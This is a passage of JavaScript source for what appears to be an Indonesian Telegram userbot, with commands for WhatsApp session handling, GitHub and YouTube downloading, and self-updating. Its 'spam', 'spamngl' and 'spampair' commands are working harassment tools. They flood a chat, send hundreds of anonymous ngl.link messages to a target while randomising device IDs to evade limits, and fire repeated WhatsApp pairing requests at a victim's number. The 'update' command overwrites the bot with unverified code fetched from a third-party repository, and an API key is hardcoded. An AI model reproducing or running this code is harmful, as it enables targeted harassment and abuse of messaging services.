 <b>ɪɴғᴏᴍᴀsɪ ᴅᴇᴛᴀɪʟ ᴅᴀʀɪ ᴡʜᴀᴛsᴀᴘᴘ</b>

➤ <b>ɴᴏ:</b> <code>${formattedNumber}</code>
➤ <b>sᴛᴀᴛᴜs:</b> ᴘʀᴏғɪʟ ᴅɪ ᴘʀɪᴠᴀᴛᴇ
</blockquote>`;
      } else {
        errorMessage = `<blockquote>
 <b>ɪɴғᴏʀᴍᴀsɪ ᴅᴇᴛᴀɪʟ ᴅᴀʀɪ ᴡʜᴀᴛsᴀᴘᴘ</b>

➤ <b>ɴᴏ:</b> <code>${formattedNumber}</code>
➤ <b>sᴛᴀᴛᴜs:</b> ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ᴅᴀᴛᴀ

➤ <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code>
</blockquote>`;
      }
      
      await client.sendMessage(chatId, {
        message: errorMessage,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case 'refresh': {
  (async () => {
    try {
      const chatId = message.chatId || message.chat?.id;

      const statusMsg = await client.sendMessage(chatId, {
        message: `<blockquote>🔄 <b>ᴍᴇᴍᴜʟᴀɪ ʀᴇғʀᴇsʜ sᴇssɪᴏɴ...</b></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      const previousSessionCount = sessions.size;

      sessions.clear();

      await initializeWhatsAppConnections(client);

      const currentSessionCount = sessions.size;

      let sessionList = '';
      if (currentSessionCount > 0) {
        sessions.forEach((sock, number) => {
          const status = sock.ws.readyState === 1 ? '🟢 ᴏɴʟɪɴᴇ' : '🔴 ᴏғғʟɪɴᴇ';
          sessionList += `${status} | ${number}\n`;
        });
      }

      await client.editMessage(chatId, {
        message: statusMsg.id,
        text: `<blockquote>✅ <b>ʀᴇғʀᴇsʜ sᴇssɪᴏɴ sᴇʟᴇsᴀɪ</b>\n\n<b>ʙᴇʀʜᴀsɪʟ:</b> ${currentSessionCount} session\n\n${currentSessionCount > 0 ? `<b>sᴇssɪᴏɴ ᴀᴋᴛɪғ:</b>\n${sessionList}` : `❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇssɪᴏɴ ʏᴀɴɢ ᴛᴇʀʜᴜʙᴜɴɢ</b>\n\nɢᴜɴᴀᴋᴀɴ <code>${prefix}reqpair</code> ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴀᴛ sᴇssɪᴏɴ ʙᴀʀᴜ`}</blockquote>`,
        parseMode: "html"
      });

    } catch (error) {
      console.error('❌ Error .refresh:', error);
      await client.sendMessage(message.chatId, {
        message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ʀᴇғʀᴇsʜ sᴇssɪᴏɴ:</b> ${error.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case 'spam': {
  (async () => {
    let sentMessage;
    
    try {
      const chatId = message.chatId || message.chat.id;
      const args = message.text.split(" ").slice(1);
      const replyMsg = await message.getReplyMessage?.() || message.replyTo;

      if (args.length < 1) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b>\n${prefix}spam jumlah [teks]</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const jumlah = parseInt(args[0]);
      const teks = args.slice(1).join(" ").trim();

      if (isNaN(jumlah) || jumlah < 1 || jumlah > 1000) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ᴊᴜᴍʟᴀʜ ʜᴀʀᴜs 1-1000!</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      if (!teks && !replyMsg) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴛᴇᴋs!</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      sentMessage = await client.sendMessage(chatId, {
        message: `<blockquote>🚀 <b>ᴍᴇᴍᴜʟᴀɪ sᴘᴀᴍ...</b></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      let successCount = 0;
      let failedCount = 0;

      let spamType = 'text';
      let mediaBuffer = null;
      let spamContent = teks;

      if (replyMsg) {
        try {
          if (replyMsg.photo || replyMsg.media?.photo) {
            spamType = 'photo';
            mediaBuffer = await client.downloadMedia(replyMsg.media || replyMsg);
            spamContent = replyMsg.text || teks || '';
          } else if (replyMsg.video || replyMsg.media?.video) {
            spamType = 'video';
            mediaBuffer = await client.downloadMedia(replyMsg.media || replyMsg);
            spamContent = replyMsg.text || teks || '';
          } else if (replyMsg.audio) {
            spamType = 'audio';
            mediaBuffer = await client.downloadMedia(replyMsg.media || replyMsg);
            spamContent = replyMsg.text || teks || '';
          } 
        } catch (mediaError) {
          spamType = 'text';
          spamContent = teks || replyMsg.text || 'SPAM';
        }
      }

      for (let i = 0; i < jumlah; i++) {
        try {
          if (spamType === 'text') {
            await client.sendMessage(chatId, {
              message: spamContent,
              parseMode: "html"
            });
            
          } else if (mediaBuffer) {
            const filePath = path.join(process.cwd(), `spam_${Date.now()}_${i}.${
              spamType === 'photo' ? 'jpg' : 
              spamType === 'video' ? 'mp4' : 
              spamType === 'audio' ? 'mp3' : 'bin'
            }`);
            
            fs.writeFileSync(filePath, mediaBuffer);
            
            await client.sendFile(chatId, {
              file: filePath,
              caption: (spamType !== 'sticker' && spamContent) ? spamContent : undefined,
              parseMode: (spamType !== 'sticker' && spamContent) ? "html" : undefined
            });
            
            if (fs.existsSync(filePath)) {
              fs.unlinkSync(filePath);
            }
          }
          
          successCount++;
          
          if ((i + 1) % 5 === 0 || i === jumlah - 1) {
            try {
              await client.editMessage(chatId, {
                message: sentMessage.id,
                text: `<blockquote>🚀 <b>ᴘʀᴏɢʀᴇss sᴘᴀᴍ...</b></blockquote>`,
                parseMode: "html"
              });
            } catch (editError) {

            }
          }
          
          await new Promise(resolve => setTimeout(resolve, 1000));
          
        } catch (error) {
          failedCount++;
          
          if (error.message.includes('FLOOD') || error.message.includes('Too Many')) {
            break;
          }
        }
      }

      try {
        await client.deleteMessages(chatId, [sentMessage.id], { revoke: true });
      } catch (deleteError) {

      }

      await client.sendMessage(chatId, {
        message: `<blockquote>✅ <b>sᴘᴀᴍ sᴇʟᴇsᴀɪ!</b></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

    } catch (error) {
      const chatId = message.chatId || message.chat.id;
      
      if (sentMessage) {
        try {
          await client.deleteMessages(chatId, [sentMessage.id], { revoke: true });
        } catch (deleteError) {

        }
      }
      
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>sᴘᴀᴍ ɢᴀɢᴀʟ:</b> ${error.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case "spamngl": {
  const text = args.join(" "); 
  
  if (!text) {
    await client.sendMessage(chatId, { 
      message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}spamngl jumlah pesan @username</blockquote>`, 
      parseMode: "html", 
      replyTo: message.id 
    });
    break;
  }

  const parts = text.split(/\s+/);
  if (parts.length < 3) { 
    await client.sendMessage(chatId, { 
      message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}spamngl jumlah pesan @username</blockquote>`, 
      parseMode: "html", 
      replyTo: message.id 
    });
    break;
  }

  const loops = Number(parts[0]);
  const username = parts[parts.length - 1].replace(/^@/, "");
  const messageText = parts.slice(1, parts.length - 1).join(" ");

  if (isNaN(loops) || loops <= 0 || loops > 500) {
    await client.sendMessage(chatId, { 
      message: `<blockquote>⚠️ ᴊᴜᴍʟᴀʜ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ 1-500</blockquote>`, 
      parseMode: "html", 
      replyTo: message.id 
    });
    break;
  }
  
  if (!messageText) {
    await client.sendMessage(chatId, { 
      message: `<blockquote>⚠️ ᴘᴇsᴀɴ ᴋᴏsᴏɴɢ</blockquote>`, 
      parseMode: "html", 
      replyTo: message.id 
    });
    break;
  }
  
  if (!username || username.length < 1) {
    await client.sendMessage(chatId, { 
      message: `<blockquote>⚠️ ᴜsᴇʀɴᴀᴍᴇ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ</blockquote>`, 
      parseMode: "html", 
      replyTo: message.id 
    });
    break;
  }

  const progressMsg = await client.sendMessage(chatId, { 
    message: `<blockquote>🚀 ᴍᴇɴɢɪʀɪᴍ ${loops} ᴘᴇsᴀɴ ᴋᴇ @${username}...</i></blockquote>`, 
    parseMode: "html", 
    replyTo: message.id 
  });

  let successCount = 0;
  let failCount = 0;

  for (let i = 1; i <= loops; i++) {
    try {
      const deviceId = Math.random().toString(36).substring(2, 15) + 
                       Math.random().toString(36).substring(2, 15) + 
                       Math.random().toString(36).substring(2, 15);
      
      const body = `username=${username}&question=${encodeURIComponent(messageText)}&deviceId=${deviceId}`;

      const res = await fetch("https://ngl.link/api/submit", {
        method: "POST",
        headers: { 
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        body
      });

      if (res.ok) {
        successCount++;
      } else {
        failCount++;
        console.log(`Gagal mengirim pesan ${i}: Status ${res.status}`);
      }
    } catch (err) {
      failCount++;
      console.log(`Error mengirim pesan ${i}:`, err.message);
    }

    if (i % 5 === 0 || i === loops) {
      try {
        await client.editMessage(chatId, {
          message: progressMsg.id,
          text: `<blockquote>🚀 ᴍᴇɴɢɪʀɪᴍ ${loops} ᴘᴇsᴀɴ ᴋᴇ @${username}\n\n⌛️ ᴘʀᴏɢʀᴇss: ${i}/${loops}</blockquote>`,
          parseMode: "html"
        });
      } catch (editErr) {
        console.log("Gagal update progress:", editErr.message);
      }
    }

    if (i < loops) await new Promise(r => setTimeout(r, 5000));
  }

  await client.sendMessage(chatId, { 
    message: `<blockquote>✅ sᴇʟᴇsᴀɪ sᴘᴀᴍɴɢʟ\n\n➤ ᴛᴏᴛᴀʟ: ${loops} ᴘᴇsᴀɴ\n➤ ʙᴇʀʜᴀsɪʟ: ${successCount}\n➤ ɢᴀɢᴀʟ: ${failCount}\n➤ ᴛᴜᴊᴜᴀɴ: @${username}</blockquote>`, 
    parseMode: "html", 
    replyTo: message.id 
  });

  try {
    await client.deleteMessages(chatId, [progressMsg.id], { revoke: true });
  } catch (delErr) {
    console.log("Gagal hapus progress message:", delErr.message);
  }
  
  break;
}

case "spampair": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat.id;
      const args = message.text.split(" ").slice(1);

      if (args.length < 1) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}spampair 62xxxx [jumlah]</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const botNumber = args[0].replace(/[^0-9]/g, "");
      const jumlah = args[1] ? parseInt(args[1]) : 1;

      if (!botNumber || botNumber.length < 10) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ɴᴏ ᴡʜᴀᴛsᴀᴘᴘ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ!</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      if (jumlah < 1 || jumlah > 100) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ᴊᴜᴍʟᴀʜ ʜᴀʀᴜs 1-100!</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      if (jumlah === 1) {
        await spamConnectToWhatsApp(client, botNumber, chatId);
        return;
      }

      const progressMsg = await client.sendMessage(chatId, {
        message: `<blockquote>🚀 <b>ᴍᴇᴍᴜʟᴀɪ sᴘᴀᴍ ᴘᴀɪʀɪɴɢ</b>
        
╰➤ ɴᴜᴍʙᴇʀ : ${botNumber}
╰➤ ᴊᴜᴍʟᴀʜ : ${jumlah} sᴇssɪᴏɴ
╰➤ sᴛᴀᴛᴜs : ᴘʀᴏɢʀᴇss...
</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      let successCount = 0;
      let failCount = 0;
      const activeSessions = [];

      for (let i = 1; i <= jumlah; i++) {
        try {
          await spamConnectToWhatsApp(client, botNumber, chatId, i);
          successCount++;
          activeSessions.push(i);

          await client.editMessage(chatId, {
            message: progressMsg.id,
            text: `<blockquote>🚀 <b>ᴍᴇᴍᴜʟᴀɪ sᴘᴀᴍ ᴘᴀɪʀɪɴɢ</b>
            
╰➤ ɴᴜᴍʙᴇʀ : ${botNumber}
╰➤ ᴊᴜᴍʟᴀʜ : ${jumlah} sᴇssɪᴏɴ
╰➤ sᴛᴀᴛᴜs : ᴘʀᴏɢʀᴇss...

📊 <b>ᴘʀᴏɢʀᴇss:</b> ${i}/${jumlah}
✅ <b>ʙᴇʀʜᴀsɪʟ:</b> ${successCount}
❌ <b>ɢᴀɢᴀʟ:</b> ${failCount}
</blockquote>`,
            parseMode: "html"
          });

          if (i < jumlah) {
            await new Promise(resolve => setTimeout(resolve, 3000));
          }

        } catch (error) {
          failCount++;
          console.error(`Error session ${i}:`, error.message);
          
          await client.editMessage(chatId, {
            message: progressMsg.id,
            text: `<blockquote>🚀 <b>ᴍᴇᴍᴜʟᴀɪ sᴘᴀᴍ ᴘᴀɪʀɪɴɢ</b>
            
╰➤ ɴᴜᴍʙᴇʀ : ${botNumber}
╰➤ ᴊᴜᴍʟᴀʜ : ${jumlah} sᴇssɪᴏɴ
╰➤ sᴛᴀᴛᴜs : ᴘʀᴏɢʀᴇss...

📊 <b>ᴘʀᴏɢʀᴇss:</b> ${i}/${jumlah}
✅ <b>ʙᴇʀʜᴀsɪʟ:</b> ${successCount}
❌ <b>ɢᴀɢᴀʟ:</b> ${failCount}
</blockquote>`,
            parseMode: "html"
          });
        }
      }

      let sessionList = '';
      if (activeSessions.length > 0) {
        sessionList = '\n<b>sᴇssɪᴏɴ ʙᴇʀʜᴀsɪʟ:</b>\n';
        activeSessions.slice(0, 15).forEach(sessionNum => {
          sessionList += `• Session ${sessionNum}\n`;
        });
        if (activeSessions.length > 15) {
          sessionList += `• ...ᴅᴀɴ ${activeSessions.length - 15} ʟᴀɪɴɴʏᴀ\n`;
        }
      }

      await client.editMessage(chatId, {
        message: progressMsg.id,
        text: `<blockquote>✅ <b>sᴘᴀᴍ ᴘᴀɪʀɪɴɢ sᴇʟᴇsᴀɪ</b>

╰➤ ɴᴏᴍᴏʀ : ${botNumber}
╰➤ ᴊᴜᴍʟᴀʜ : ${jumlah} sᴇssɪᴏɴ
╰➤ ʙᴇʀʜᴀsɪʟ : ${successCount}
╰➤ ɢᴀɢᴀʟ : ${failCount}
</blockquote>`,
        parseMode: "html"
      });

    } catch (error) {
      console.error("Error in reqpair command:", error);
      const chatId = message.chatId || message.chat.id;
      
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇɴɢʜᴜʙᴜɴɢᴋᴀɴ ᴋᴇ ᴡʜᴀᴛsᴀᴘᴘ!</b>\n\n📝 <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case "github": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat?.id;
      const args = message.text.split(" ").slice(1);
      
      if (args.length < 2) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}github nama_github nama_repo</blockquote></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const username = args[0];
      const repo = args[1];
      const branch = args[2] || 'main';

      const progressMsg = await client.sendMessage(chatId, {
        message: `<blockquote>⏳ <b>➤ ᴜsᴇʀ:</b> ${username}\n➤ <b>ʀᴇᴘᴏ:</b> ${repo}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      const zipPath = path.join(process.cwd(), `${repo}.zip`);

      try {
        await client.editMessage(chatId, {
          message: progressMsg.id,
          text: `<blockquote>⏳ <b>ᴍᴇɴɢᴀᴍʙɪʟ ɪsɪ ғɪʟᴇ...</b></blockquote>`,
          parseMode: "html"
        });

        const apiUrl = `https://api.github.com/repos/${username}/${repo}/git/trees/${branch}?recursive=1`;
        const treeResponse = await fetch(apiUrl, { 
          headers: { "User-Agent": "TelegramBot" },
          timeout: 30000
        });
        
        if (!treeResponse.ok) {
          if (treeResponse.status === 404) {
            throw new Error('Repository tidak ditemukan! Pastikan username dan repo benar.');
          }
          throw new Error(`GitHub API error: ${treeResponse.status}`);
        }

        const treeData = await treeResponse.json();

        if (!treeData.tree || treeData.tree.length === 0) {
          throw new Error('Repository kosong atau tidak ada file!');
        }

        await client.editMessage(chatId, {
          message: progressMsg.id,
          text: `<blockquote>⏳ <b>ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ${treeData.tree.length} ғɪʟᴇ...</i></blockquote>`,
          parseMode: "html"
        });

        const output = fs.createWriteStream(zipPath);
        const archive = archiver('zip', {
          zlib: { level: 9 }
        });

        archive.pipe(output);

        let downloadedFiles = 0;
        let totalFiles = treeData.tree.filter(file => file.type === 'blob').length;

        for (const file of treeData.tree) {
          if (file.type === 'blob') {
            try {
              const fileUrl = `https://raw.githubusercontent.com/${username}/${repo}/${branch}/${file.path}`;
              const fileResponse = await fetch(fileUrl, { timeout: 15000 });
              
              if (fileResponse.ok) {
                const fileBuffer = await fileResponse.buffer();
                archive.append(fileBuffer, { name: file.path });
                downloadedFiles++;
                
                if (downloadedFiles % 10 === 0) {
                  await client.editMessage(chatId, {
                    message: progressMsg.id,
                    text: `<blockquote>⏳ <b>ᴘʀᴏɢʀᴇss: ${downloadedFiles}</b></blockquote>`,
                    parseMode: "html"
                  });
                }
              }
            } catch (fileError) {

            }
          }
        }

        await new Promise((resolve, reject) => {
          output.on('close', resolve);
          archive.on('error', reject);
          archive.finalize();
        });

        await client.editMessage(chatId, {
          message: progressMsg.id,
          text: `<blockquote>🚀 <b>ᴍᴇɴɢɪʀɪᴍ ғɪʟᴇ ziᴘ...</b></blockquote>`,
          parseMode: "html"
        });

        const stats = fs.statSync(zipPath);
        const fileSizeMB = (stats.size / (1024 * 1024)).toFixed(2);

        if (stats.size === 0) {
          throw new Error('File zip kosong! Tidak ada file yang berhasil didownload');
        }

        await client.sendFile(chatId, {
          file: zipPath,
          fileName: `${username}_${repo}.zip`,
          forceDocument: true
        }, {
          replyTo: message.id,
          caption: `<blockquote>✅ <b>ғɪʟᴇ ʙᴇʀʜᴀsɪʟ ᴅɪᴅᴏᴡɴʟᴏᴀᴅ!</b>\n\n➤ <b>ɴᴀᴍᴀ:</b> ${username}\n➤ <b>ʀᴇᴘᴏ:</b> ${repo}\n➤ <b>ᴛᴏᴛᴀʟ ғɪʟᴇ:</b> ${totalFiles}</blockquote>`,
          parseMode: "html"
        });

        await client.deleteMessages(chatId, [progressMsg.id], { revoke: true });

        fs.unlinkSync(zipPath);

      } catch (downloadError) {
        await client.editMessage(chatId, {
          message: progressMsg.id,
          text: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ғɪʟᴇ!</b>\n\n<b>Error:</b> ${downloadError.message}</blockquote>`,
          parseMode: "html"
        });
        
        if (fs.existsSync(zipPath)) {
          fs.unlinkSync(zipPath);
        }
      }

    } catch (error) {
      const chatId = message.chatId || message.chat?.id;
      
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ!</b>\n\n<b>ᴇʀʀᴏʀ:</b> ${error.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case "yt": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat?.id;
      const args = message.text.split(" ").slice(1);
      
      if (args.length < 1) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b>${prefix}yt judul</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const query = args.join(" ");
      const progressMsg = await client.sendMessage(chatId, {
        message: `<blockquote>🚀 ᴍᴇɴᴄᴀʀɪ <b>${query}</b>...</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      try {
        const searchResult = await yts(query);
        if (!searchResult.videos.length) {
          throw new Error('ᴠɪᴅᴇᴏ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ');
        }

        const video = searchResult.videos[0];
        const youtubeUrl = video.url;
        
        await client.editMessage(chatId, {
          message: progressMsg.id,
          text: `<blockquote>🚀 ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ: <b>${video.title}</b></blockquote>`,
          parseMode: "html"
        });

        const downloadApiUrl = `https://api.botcahx.eu.org/api/dowloader/yt?url=${encodeURIComponent(youtubeUrl)}&apikey=47200ca6`;
        const response = await fetch(downloadApiUrl, { timeout: 60000 });
        const downloadData = await response.json();
        
        if (!downloadData.status || !downloadData.result) {
          throw new Error('ɢᴀɢᴀʟ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟɪɴᴋ ᴅᴏᴡɴʟᴏᴀᴅ');
        }

        const downloadUrl = downloadData.result.mp4;
        
        if (!downloadUrl || typeof downloadUrl !== 'string') {
          throw new Error('ʟɪɴᴋ ᴅᴏᴡɴʟᴏᴀᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ');
        }

        await client.editMessage(chatId, {
          message: progressMsg.id,
          text: `<blockquote>🚀 ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ...\n\n🎬 <b>${video.title}</b></blockquote>`,
          parseMode: "html"
        });

        const videoResponse = await fetch(downloadUrl, { 
          timeout: 120000,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });
        
        if (!videoResponse.ok) {
          throw new Error('ɢᴀɢᴀʟ ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ');
        }

        const videoBuffer = await videoResponse.arrayBuffer();
        const buffer = Buffer.from(videoBuffer);

        if (buffer.length === 0) {
          throw new Error('ғɪʟᴇ ᴠɪᴅᴇᴏ ᴋᴏsᴏɴɢ');
        }

        const fileSizeMB = (buffer.length / (1024 * 1024)).toFixed(1);
        if (buffer.length > 500 * 1024 * 1024) {
          throw new Error(`ғɪʟᴇ ᴛᴇʀʟᴀʟᴜ ʙᴇsᴀʀ ${fileSizeMB}MB. ᴍᴀᴋsɪᴍᴀʟ 500MB`);
        }

        const tempFile = `./temp_${Date.now()}.mp4`;
        fs.writeFileSync(tempFile, buffer);

        let thumbBuffer = null;
        const thumbUrl = video.thumbnail;
        if (thumbUrl) {
          try {
            const thumbResponse = await fetch(thumbUrl, { timeout: 15000 });
            if (thumbResponse.ok) {
              const thumbArrayBuffer = await thumbResponse.arrayBuffer();
              thumbBuffer = Buffer.from(thumbArrayBuffer);
            }
          } catch (thumbError) {
            console.log('Gagal download thumbnail:', thumbError.message);
          }
        }

        await client.editMessage(chatId, {
          message: progressMsg.id,
          text: `<blockquote>🚀 ᴍᴇɴɢɪʀɪᴍ ᴠɪᴅᴇᴏ...\n\n⏳ ᴍᴏʜᴏɴ ᴛᴜɴɢɢᴜ, ᴠɪᴅᴇᴏ sᴇᴅᴀɴɢ ᴅɪᴋɪʀɪᴍ...</blockquote>`,
          parseMode: "html"
        });

        const duration = video.duration.timestamp || 'Unknown';
        const views = video.views?.toLocaleString() || 'Unknown';
        const author = video.author?.name || 'Unknown';
        const title = video.title;

        try {
          await client.sendMessage(chatId, {
            file: tempFile,
            thumb: thumbBuffer,
            message: `<blockquote>➤ ᴊᴜᴅᴜʟ: \n<b>${title}</b>\n\n➤ ᴅᴜʀᴀsɪ: ${duration}\n➤ ᴠɪᴇᴡs: ${views}\n➤ ᴄʜᴀɴɴᴇʟ: ${author}\n➤ sɪᴢᴇ: ${fileSizeMB}MB\n\n➤ <a href="${youtubeUrl}">ᴛᴏɴᴛᴏɴ ᴅɪ ʏᴏᴜᴛᴜʙᴇ</a>\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑</blockquote>`,
            parseMode: "html",
            replyTo: message.id
          });
        } catch (sendError) {
          
          try {
            await client.sendMessage(chatId, {
              file: tempFile,
              message: `<blockquote>➤ ᴊᴜᴅᴜʟ: \n<b>${title}</b>\n\n➤ ᴅᴜʀᴀsɪ: ${duration}\n➤ ᴠɪᴇᴡs: ${views}\n➤ ᴄʜᴀɴɴᴇʟ: ${author}\n➤ sɪᴢᴇ: ${fileSizeMB}MB\n\n➤ <a href="${youtubeUrl}">ᴛᴏɴᴛᴏɴ ᴅɪ ʏᴏᴜᴛᴜʙᴇ</a>\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑</blockquote>`,
              parseMode: "html",
              replyTo: message.id
            });
          } catch (sendError2) {
            
            await client.sendMessage(chatId, {
              file: buffer,
              message: `<blockquote>➤ ᴊᴜᴅᴜʟ: \n<b>${title}</b>\n\n➤ ᴅᴜʀᴀsɪ: ${duration}\n➤ ᴠɪᴇᴡs: ${views}\n➤ ᴄʜᴀɴɴᴇʟ: ${author}\n➤ sɪᴢᴇ: ${fileSizeMB}MB\n\n➤ <a href="${youtubeUrl}">ᴛᴏɴᴛᴏɴ ᴅɪ ʏᴏᴜᴛᴜʙᴇ</a>\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑</blockquote>`,
              parseMode: "html",
              replyTo: message.id
            });
          }
        }

        fs.unlinkSync(tempFile);
        await client.deleteMessages(chatId, [progressMsg.id], { revoke: true });

      } catch (error) {
        await client.editMessage(chatId, {
          message: progressMsg.id,
          text: `<blockquote>❌ ${error.message}</blockquote>`,
          parseMode: "html"
        });
      }

    } catch (error) {
      const chatId = message.chatId || message.chat?.id;
      
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ ᴇʀʀᴏʀ: ${error.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case "update": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat?.id;
      
      await client.sendMessage(chatId, {
        message: "<blockquote>🚀 <b>Memulai update script...</b></blockquote>",
        parseMode: "html",
        replyTo: message.id
      });

      const scriptUrl = "https://raw.githubusercontent.com/ObyDatabase/Databases/main/main.js";
      const scriptPath = path.resolve(process.cwd(), "./main.js");

      // Backup file lama
      try {
        if (fs.existsSync(scriptPath)) {
          const backupPath = scriptPath + ".bak_" + Date.now();
          fs.copyFileSync(scriptPath, backupPath);
          console.log("✅ Backup file lama berhasil");
        }
      } catch (e) {
        console.warn("⚠️ Backup gagal:", e.message);
      }

      // Download script baru
      let newScriptResp;
      try {
        newScriptResp = await axios.get(scriptUrl, { timeout: 30000 });
      } catch (e) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ <b>Gagal mengunduh script dari GitHub:</b> <code>${e.message}</code></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
        return;
      }

      const newScript = String(newScriptResp.data || "");

      // Tulis file baru
      try {
        fs.writeFileSync(scriptPath, newScript, "utf8");
      } catch (e) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ <b>Gagal menulis file:</b> <code>${e.message}</code></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
        return;
      }

      await client.sendMessage(chatId, {
        message: "<blockquote>✅ <b>Script berhasil diperbarui.</b>\n\n🔄 <b>Bot akan restart otomatis dalam 3 detik...</b></blockquote>",
        parseMode: "html",
        replyTo: message.id
      });

      // Restart setelah 3 detik
      setTimeout(() => {
        try { 
          process.exit(0); 
        } catch (e) { 
          process.exit(1);
        }
      }, 3000);

    } catch (error) {
      console.error("❌ Error update:", error);
      const chatId = message.chatId || message.chat?.id;
      
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>Gagal update:</b> <code>${error.message}</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}
        }
    }, new NewMessage({}));
}

main();